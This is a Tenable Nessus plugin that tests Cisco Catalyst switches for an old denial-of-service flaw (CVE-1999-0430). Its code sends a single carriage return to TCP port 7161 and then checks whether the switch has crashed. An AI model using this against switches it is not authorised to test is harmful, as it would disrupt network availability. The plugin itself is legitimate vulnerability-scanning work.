#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10046);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-1999-0430");
 script_bugtraq_id(705);
 script_xref(name:"OSVDB", value:"1103");

 script_name(english:"Cisco Catalyst Supervisor Remote Reload DoS");
 script_summary(english:"Crashes a Cisco switch");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote switch has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be a Cisco Catalyst switch.  This device\n",
     "runs an undocumented TCP service.  Sending a carriage return to this\n",
     "port causes the switch to immediately reset.  A remote attacker could\n",
     "repeatedly exploit this to disable the switch."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999_1/1077.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.cisco.com/warp/public/707/cisco-sa-19990324-cat7161.shtml"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the fix referenced in the vendor's advisory."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"CISCO");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_require_ports(7161);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if(get_port_state(7161))
{
 soc = open_sock_tcp(7161);
 if(soc)
 {
  start_denial();
  data = raw_string(13);
  send(socket:soc, data:data);
  sleep(5);
  alive = end_denial();
   if(!alive){
  		security_hole(7161);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}
 
